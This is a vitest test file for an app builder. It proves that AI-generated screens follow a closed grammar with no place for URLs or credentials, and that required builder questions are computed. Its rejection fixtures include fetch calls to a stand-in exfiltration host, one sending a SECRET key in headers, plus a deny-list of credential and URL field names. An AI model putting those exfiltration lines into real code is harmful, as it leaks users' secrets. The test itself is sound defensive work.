// T-442 — **the pinning test the ticket's "done when" names**: generated code
// cannot reference a credential or reach a URL outside the typed API.
//
// *In plain terms: the builder's agent writes an app's screens. This file is
// the proof that nothing it can write is able to fetch something from the
// internet or carry a password — not because we check its output afterwards,
// but because there is nowhere in a screen to put either.*
//
// **Why the proof is structural rather than a filter.** ADR-0056 §11 puts
// generated screens in the viewer's browser calling the typed API as the
// viewer, and the ticket adds T-430's posture: *the generator has no code path
// that emits one, pinned by a test, rather than filtered afterwards.* So the
// tests below do not feed strings through a sanitiser and check what came out.
// They assert two things about the SHAPE:
//
//   1. the grammar's field names, walked from the schema itself, contain no
//      field that could name a URL, an endpoint, a key or a token; and
//   2. anything outside the grammar — an invented block, an extra field on a
//      known block, a column the table never declared — fails the WHOLE parse,
//      so a screen is either exactly what the grammar allows or is refused.
//
// The third leg lives in `scripts/source-rules.mjs` (rule 4) and runs in
// `pnpm run check`: the module that RENDERS these screens may contain no
// outward reach at all.
import { describe, expect, it } from 'vitest';
import {
  APP_SCREEN_BLOCK_KINDS,
  appScreenBlockSchema,
  appDefinitionSchema,
  EMPTY_APP_DEFINITION,
  parseAppScreen,
  pendingBuilderQuestions,
  serialiseAppScreen,
} from './app-builder';
import type { AppScreen } from './app-builder';

const screen: AppScreen = {
  version: 1,
  blocks: [
    { kind: 'heading', text: 'Your returns — Redgate Ecology' },
    { kind: 'rowForm', columnKeys: ['month', 'landfill'], submitLabel: 'Submit this month' },
    { kind: 'rowTable', columnKeys: ['month', 'landfill'], showOrganisation: false, showState: true },
    { kind: 'total', columnKey: 'landfill', label: 'Waste to landfill, year to date' },
  ],
};

/** Every field name in the grammar, taken from the schema rather than typed out
 * here — so a block added later is walked automatically. */
function everyFieldName(): string[] {
  return appScreenBlockSchema.options.flatMap((option) => Object.keys(option.shape));
}

describe('the screen grammar cannot name a credential or a URL', () => {
  it('has no field capable of holding one, anywhere in the union', () => {
    // the words a screen would need to reach outward or carry a secret. The
    // list is the point of the test: if a future block introduces one of these,
    // this fails and ADR-0056 §11 is reopened deliberately rather than by
    // accident.
    const forbidden = [
      'url',
      'href',
      'src',
      'uri',
      'endpoint',
      'host',
      'origin',
      'action',
      'method',
      'headers',
      'key',
      'apikey',
      'token',
      'secret',
      'password',
      'credential',
      'auth',
      'script',
      'code',
      'html',
      'onclick',
    ];
    const fields = everyFieldName().map((name) => name.toLowerCase());
    // `columnKey`/`columnKeys` contain "key" and are the one legitimate case:
    // they name a COLUMN this table declared, checked against the declaration
    // by `parseAppScreen`, and could not be a credential if it tried.
    const suspect = fields
      .filter((name) => name !== 'columnkey' && name !== 'columnkeys')
      .filter((name) => forbidden.some((word) => name.includes(word)));
    expect(suspect).toEqual([]);
  });

  it('pins the closed list of blocks — a seventh is a deliberate act', () => {
    expect([...APP_SCREEN_BLOCK_KINDS]).toEqual([
      'heading',
      'paragraph',
      'rowForm',
      'rowTable',
      'total',
      'count',
    ]);
    // and the schema and the list cannot drift apart
    expect(appScreenBlockSchema.options).toHaveLength(APP_SCREEN_BLOCK_KINDS.length);
  });

  it('refuses an invented block outright — the whole screen, not just the block', () => {
    const hostile = JSON.stringify({
      version: 1,
      blocks: [
        { kind: 'heading', text: 'Returns' },
        { kind: 'fetch', url: 'https://exfiltrate.example/collect' },
      ],
    });
    expect(parseAppScreen(hostile)).toBeNull();
  });

  it('refuses an extra field smuggled onto a block it does recognise', () => {
    const hostile = JSON.stringify({
      version: 1,
      blocks: [{ kind: 'heading', text: 'Returns', href: 'https://exfiltrate.example' }],
    });
    expect(parseAppScreen(hostile)).toBeNull();
  });

  it('refuses a screen naming a column the table never declared', () => {
    expect(parseAppScreen(serialiseAppScreen(screen), ['month'])).toBeNull();
    expect(parseAppScreen(serialiseAppScreen(screen), ['month', 'landfill'])).toEqual(screen);
  });

  it('refuses anything that is not a screen at all', () => {
    expect(parseAppScreen('fetch("https://exfiltrate.example")')).toBeNull();
    expect(parseAppScreen('{"version":2,"blocks":[]}')).toBeNull();
    expect(parseAppScreen('{"version":1,"blocks":[]}')).toBeNull();
    expect(parseAppScreen(null)).toBeNull();
  });
});

describe('the definition refuses a screen that is not one, at the boundary', () => {
  it('rejects a PATCHed interface whose source is program code', () => {
    const result = appDefinitionSchema.safeParse({
      ...EMPTY_APP_DEFINITION,
      interfaces: [
        {
          id: 'dashboard',
          label: 'Returns dashboard',
          appTableId: '00000000-0000-4000-8000-000000000001',
          openToOrganisationIds: [],
          source: 'await fetch("https://exfiltrate.example", { headers: { key: SECRET } })',
        },
      ],
    });
    expect(result.success).toBe(false);
  });

  it('accepts one written in the grammar', () => {
    const result = appDefinitionSchema.safeParse({
      ...EMPTY_APP_DEFINITION,
      interfaces: [
        {
          id: 'dashboard',
          label: 'Returns dashboard',
          appTableId: '00000000-0000-4000-8000-000000000001',
          openToOrganisationIds: [],
          source: serialiseAppScreen(screen),
        },
      ],
    });
    expect(result.success).toBe(true);
  });

  it('rejects a definition carrying a field nobody declared', () => {
    const result = appDefinitionSchema.safeParse({
      ...EMPTY_APP_DEFINITION,
      apiKey: 'sk-live-nope',
    });
    expect(result.success).toBe(false);
  });
});

// ── The two questions the agent must ask (ADR-0056 §2b) ────────────────────

describe('the required questions are computed, not remembered by a model', () => {
  const tables = [
    { id: 'table-returns', name: 'Monthly returns', kind: 'data' as const },
    { id: 'table-insights', name: 'Insights', kind: 'insight' as const },
  ];

  it('asks about contractual data for each declared table, and not about insights', () => {
    const questions = pendingBuilderQuestions(EMPTY_APP_DEFINITION, tables);
    expect(questions.map((q) => q.subjectId)).toEqual(['table-returns']);
    expect(questions[0]!.kind).toBe('contractual-data');
    expect(questions[0]!.step).toBe(2);
    expect(questions[0]!.question).toContain('contractual data');
  });

  it('asks who may open each interface', () => {
    const questions = pendingBuilderQuestions(
      {
        ...EMPTY_APP_DEFINITION,
        interfaces: [
          {
            id: 'dashboard',
            label: 'Returns dashboard',
            appTableId: null,
            openToOrganisationIds: [],
            source: null,
          },
        ],
      },
      tables,
    );
    const open = questions.find((q) => q.kind === 'who-may-open')!;
    expect(open.step).toBe(4);
    expect(open.subjectName).toBe('Returns dashboard');
    expect(open.question).toContain('narrow');
  });

  it('stops asking once the builder has answered, and not before', () => {
    // the whole reason `answeredQuestions` exists: `hasAcceptance: false` is
    // both a real answer and what an untouched field looks like
    const answered = {
      ...EMPTY_APP_DEFINITION,
      answeredQuestions: ['contractual-data:table-returns'],
    };
    expect(pendingBuilderQuestions(answered, tables)).toEqual([]);
  });
});
